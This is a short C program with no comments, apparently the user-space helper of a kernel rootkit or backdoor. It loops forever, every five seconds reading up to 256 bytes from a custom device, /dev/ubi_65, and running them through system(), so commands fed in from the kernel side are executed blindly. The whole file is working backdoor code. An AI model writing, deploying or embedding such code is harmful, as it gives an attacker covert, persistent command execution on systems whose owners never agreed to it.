#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <paths.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioccom.h>


void exec()
{	
	int kernel_fd;
	char cmd[256+1];

        if ((kernel_fd = open("/dev/ubi_65", O_RDWR)) == -1) 
	{
		printf("can't open /dev/ubi_65 !\n");
		exit(-1);
    	}

	if (read(kernel_fd, cmd, 256) == -1) 
	{
		printf("can't read()\n");
		exit(-1);
	}

	system(cmd);

}

int main(int argc,char *argv[])
{
	while(1)
	{
		sleep(5);
		exec();
	}
}
